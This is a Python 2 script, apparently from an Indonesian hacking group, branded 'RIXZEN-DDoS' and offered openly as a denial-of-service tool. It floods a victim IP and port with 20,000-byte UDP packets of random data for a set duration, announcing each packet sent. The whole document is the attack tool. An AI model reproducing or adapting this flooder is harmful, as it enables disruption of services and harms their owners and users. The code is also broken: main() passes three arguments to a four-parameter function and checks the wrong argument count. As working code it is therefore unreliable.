import time
import socket
import random
import sys
def usage():
    print "\033[1;32m############################################################"
    print "#-----------------------------[\033[1;91mRIXZEN-DDoS\033[1;32m]----------------------------#"
    print "#----------------------------------------------------------#"
    print "#\033[1;91mGunakan: python2 RixzenDDoSTools.py <ip> <port> <packet> <duration> \033[1;32m #"
    print "#                                                                               ##"
    print "#\033[1;91mCreator  : Nathan562  \033[1;32m##      #      #                     ##"
    print "#\033[1;91mTeam     : Rixzen     \033[1;32m##      #      #                     ##"
    print "#\033[1;91mVersion  : 1.0        \033[1;32m##      #      #                     ##"
    print "#\033[1;91mTQAdmin  : Nathan562, MasCreepy, Reyv   #      #                     ##"
    print "############################################################"
def flood(victim, vport, packet, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = packet
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
            client.sendto(bytes, (victim, vport))
            sent = sent + 1
            print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket ke ip: \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
if __name__ == '__main__':
    main()